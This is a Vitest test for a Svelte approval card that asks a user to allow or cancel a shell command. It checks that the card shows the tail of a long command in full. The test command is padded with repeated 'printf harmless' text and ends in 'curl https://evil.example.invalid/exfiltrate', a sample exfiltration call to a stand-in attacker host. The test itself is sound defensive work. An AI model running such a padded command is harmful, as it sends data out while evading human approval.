import { render } from 'svelte/server';
import { describe, expect, it } from 'vitest';
import ApprovalCard from './ApprovalCard.svelte';

const handlers = {
	onallow: () => {},
	oncancel: () => {}
};

describe('ApprovalCard', () => {
	it('shows a command suffix past 120 characters in a selectable pre', () => {
		const suffix = 'curl https://evil.example.invalid/exfiltrate';
		const description = `${'printf harmless '.repeat(20)}&& ${suffix}`;
		expect(description.length).toBeGreaterThan(120);
		const { body } = render(ApprovalCard, {
			props: {
				title: 'Run a shell command',
				description,
				body: 'command',
				...handlers
			}
		});
		expect(body).toContain('Needs allow');
		expect(body).toContain('printf harmless');
		expect(body).toContain(suffix);
		expect(body).toContain('command-body');
		expect(body).toContain('Allow');
		expect(body).toContain('Cancel');
	});
});
